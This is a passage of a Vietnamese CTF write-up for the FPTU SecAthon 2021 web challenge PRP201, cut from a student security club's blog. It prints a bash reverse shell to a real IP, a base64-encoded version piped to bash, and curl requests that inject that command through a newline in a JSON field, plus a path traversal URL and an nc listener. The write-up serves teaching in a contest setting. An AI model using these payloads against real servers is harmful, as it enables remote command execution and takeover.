highlighter-rouge">name</code> trong JSON là <code class="language-plaintext highlighter-rouge">\nls ../root\n</code>:</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_8.png" alt="500" /></p><li><p>Vậy là mình cần cách khác, nhưng trước tiên, phải chuẩn bị cái reverse shell đã :D</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>      sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/34.92.153.161/8899 0&gt;&amp;1
</pre></table></code></div></div><li><p>Có cả revshell của <code class="language-plaintext highlighter-rouge">bash</code>, <code class="language-plaintext highlighter-rouge">nc</code>, …, tìm hiểu tại <a href="https://www.revshells.com/">đây</a></p><li><p>Vẫn là tác giả đã gợi ý cho mình một cách để đẩy được revshell kia lên, sử dụng <code class="language-plaintext highlighter-rouge">base64</code>, chuyển đoạn shell ở trên thành <code class="language-plaintext highlighter-rouge">base64</code> encode, và đưa về dạng sau:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>      <span class="nb">echo</span> <span class="s2">"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjEK"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
</pre></table></code></div></div><li><p>Vậy là xong, giờ cần chuẩn bị request đầu tiên (hãy nhớ escape string :v):</p><div class="language-json highlighter-rouge"><div class="code-header"> <span label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="w">      </span><span class="p">{</span><span class="w">
          </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"</span><span class="se">\n</span><span class="s2">echo </span><span class="se">\"</span><span class="s2">c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=</span><span class="se">\"</span><span class="s2"> | base64 -d | bash</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/"</span><span class="w">
      </span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>      curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "rev","name" : "\necho \"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=\" | base64 -d | bash\n","command_log" : "rev","url" : "http://localhost:8888/"}'</span>
</pre></table></code></div></div><li><p>Gửi đi, và trước khi đến với lần request thứ 2, mình phải tạo một listener trên máy của mình đã (thực ra là VPS mình mượn của một người bạn xứ cảng):</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>      nc <span class="nt">-lvnp</span> 8899
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_9.png" alt="listener" /></p><li><p>Giờ để listener ở đó, ta quay lại với request thứ 2, request để chạy revshell:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="w">      </span><span class="p">{</span><span class="w">
          </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev_tcp"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev_tcp.sh"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"</span><span class="w">
      </span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>      curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "rev_tcp","name" : "rev_tcp.sh","command_log" : "rev","url" : "http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"}'</span>
</pre></table></code></div></div><li><p>Và gửi đi, rồi quay lại listener:</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_10.png" alt="revshell" /></p><li><p>Vậy là ta đã mở được reverse shell trên server</p><li><p>Bây giờ chỉ cần tiến hành <a href="https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd">leo thang đặc quyền</a> thôi:</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_11.png" alt="done" /></p><li><p>Ta có flag: <code class="language-plaintext highlighter-rouge">"FUSec{a9595511e650bb0ff367d8144818802b}"</code></p></ul><blockquote><p>Cảm ơn anh Khoa và anh T giấu tên (không lừa) đã luôn hỗ trợ, đấm mồm thằng em để em có thể giải được bài này</p></blockquote><blockquote><p>Mình cũng xin cảm ơn người bạn đến từ đất cảng Mai Kim Long, mặc dù chỉ quen biết qua mạng xã hội nhưng vẫn dám cho mình mượn tài khoản GCP để làm bài này, thanks bro!</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web-challenges/'>Web Challenges</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/fusec21/" class="post-tag no-text-decoration" >fusec21</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=FPTU SecAthon 2021 | Web Writeup | PRP201 - Ethical Hackers Club&url=https://fptu-ethical-hackers-club.github.io/posts/FuSec4-PRP201/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=FPTU SecAthon 2021 | Web Writeup | PRP201 - Ethical Hackers Club&u=https://fptu-ethical-hackers-club.github.io/posts/FuSec4-PRP201/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=FPTU SecAthon 2021 | Web Writeup | PRP201 - Ethical Hackers Club&url=https://fptu-ethical-hackers-club.github.io/posts/FuSec4-PRP201/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h4>Recent Update</h4><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/SVATTT-Crypto/">ASCIS (ASEAN Student Contest on Information Security) 's Cryptography Write-ups</a><li><a href="/posts/SVATTT-Web/">ASCIS (ASEAN Student Contest on Information Security) 's Web Write-ups</a><li><a href="/posts/FuSec3-Forensics/">FPTU SecAthon 2020 | Forensics Writeup | FRS301</a><li><a href="/posts/ACSC2021-Forensics/">Asian Cyber Security Challenge 2021 | Forensics Writeup | Nyong Coin, BitLocker Artifact</a><li><a href="/posts/FuSec4-CRY302-CRY303/">FPTU SecAthon 2021 | Cryptographic Writeup | CRY302 & CRY303</a></ul></div><div id="access-tags"><h4 class="text-muted">Trending Tags</h4><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/wiki/">wiki</a> <a class="post-tag" href="/tags/fusec21/">fusec21</a> <a class="post-tag" href="/tags/cryptographic/">cryptographic</a> <a class="post-tag" href="/tags/fusec20/">fusec20</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/acsc21/">acsc21</a> <a class="post-tag" href="/tags/svattt2021/">SVATTT2021</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/FuSec4-PRP202/"><div class="card-body"> <em class="timeago small" date="2021-10-13 12:30:00 +0700" >Oct 13</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2021 | Web Writeup | PRP202</h3><div class="text-muted small"><p> PRP202 Một bài hay và cực khó với mình, chả trách người anh T giấu tên cứ bảo làm thử 2 ngày để làm, nhiều lần thất bại, nhưng kết quả thật xứng đáng Source code and analysis Source code Bắt...</p></div></div></a></div><div class="card"> <a href="/posts/FuSec4-IAW301/"><div class="card-body"> <em class="timeago small" date="2021-10-09 20:30:00 +0700" >Oct 9</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2021 | Web Writeup | IAW301</h3><div class="text-muted small"><p> IAW301 Đây là một challenge dễ, nhưng thật tiếc vì mình lú nên đã gõ sai một kí tự trong payload mà không biết :’( Xin úp mặt vào tường để tự kiểm điểm :’( Bắt đầu với challenge, ta được c...</p></div></div></a></div><div class="card"> <a href="/posts/FuSec4-IAW302/"><div class="card-body"> <em class="timeago small" date="2021-10-09 23:30:00 +0700" >Oct 9</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2021 | Web Writeup | IAW302</h3><div class="text-muted small"><p> IAW302 Bài này rất đúng với mô tả của người ra đề, một người anh (không hề) lừa: “G(old)”. Một ví dụ điển hình cho một lỗi điển hình của PHP String :)) Truy cập vào bài, ta có login f...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/FuSec4-CRY302-CRY303/" class="btn btn-outline-primary" prompt="Older"><p>FPTU SecAthon 2021 | Cryptographic Writeup | CRY302 & CRY303</p></a> <a href="/posts/FuSec4-PRP202/" class="btn btn-outline-primary" prompt="Newer"><p>FPTU SecAthon 2021 | Web Writeup | PRP202</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/FPTU-Ethical-Hackers-Club">FPTU Ethical Hackers' Club</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><h4 class="text-muted">Trending Tags</h4><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/wiki/">wiki</a> <a class="post-tag" href="/tags/fusec21/">fusec21</a> <a class="post-tag" href="/tags/cryptographic/">cryptographic</a> <a class="post-tag" href="/tags/fusec20/">fusec20</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/acsc21/">acsc21</a> <a class="post-tag" href="/tags/svattt2021/">SVATTT2021</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
